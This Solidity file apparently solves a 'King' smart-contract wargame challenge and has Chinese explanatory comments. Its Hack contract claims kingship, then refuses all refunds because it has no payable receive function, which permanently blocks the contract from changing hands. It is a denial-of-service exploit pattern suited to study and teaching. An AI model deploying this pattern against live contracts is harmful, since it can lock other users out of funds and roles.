// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor(address payable target) payable {
        // target.transfer(1);
        uint prize = King(target).prize();
        (bool ok, ) = target.call{value: prize}("");
        require(ok, "call failed");
    }

    // fallback() external payable {
    //     // 调用合约不存在的函数时会调用 fallback, revert() 拒绝所有调用；
    //     revert();
    // }

    // transfer 转账时：接收函数触发了一个异常、不写 fallback 函数都会导致转账失败、transfer函数 gas > 2300 都会导致转账失败；
    // 在构造函数中使用payable修饰符来接收以太币: 是在构造函数中发送以太币（value）
}

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        // 检查传入的以太币金额是否大于等于奖金金额，或者发送者是否为合约的所有者。
        require(msg.value >= prize || msg.sender == owner);
        // 拒绝转账就能拒绝转移 king
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
